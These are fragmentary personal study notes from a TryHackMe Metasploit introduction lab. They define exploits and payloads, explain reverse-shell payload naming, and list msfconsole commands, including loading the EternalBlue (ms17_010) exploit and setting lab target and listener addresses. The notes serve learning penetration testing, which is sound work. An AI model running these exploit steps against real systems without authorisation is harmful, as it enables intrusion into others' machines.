#Metasploit 

- https://tryhackme.com/room/metasploitintro

Metasploit has two main versions:

- **Metasploit Pro**: The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI).
- **Metasploit Framework**: The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions.

The main components of the Metasploit Framework can be summarized as follows;

- **msfconsole**: The main command-line interface.
- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.

- **Exploit:** A piece of code that uses a vulnerability present on the target system.
- 
- **Vulnerability:** A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
- 
- **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

```

/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/ auxiliary/

/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/ encoders/

/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/ evasion/

/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/ exploits/

NOPs (No OPeration) do nothing
/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/

/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/

/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/

```

You will see four different directories under payloads: adapters, singles, stagers and stages.

Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.

- generic/shell_reverse_tcp
- windows/x64/shell/reverse_tcp

Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.

```

exploit
payload
singles
singles

```

msfconsole

```
ls
ping -c 1 8.8.8.8
help set
history

use exploit/windows/smb/ms17_010_eternalblue
show options
show payloads

back

info

search ms17-010

use  #  (use 2)

search type: auxiliary telnet

search apache

use auxiliary/scanner/ssh/ssh_login

provided by todb

```

working with modules

```

back
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.148.177
show options
set LHOST 

check
exploit -z
background
sessions

---
set lport 6666
setg rhosts 10.10.19.23
unset payload
exploit

```

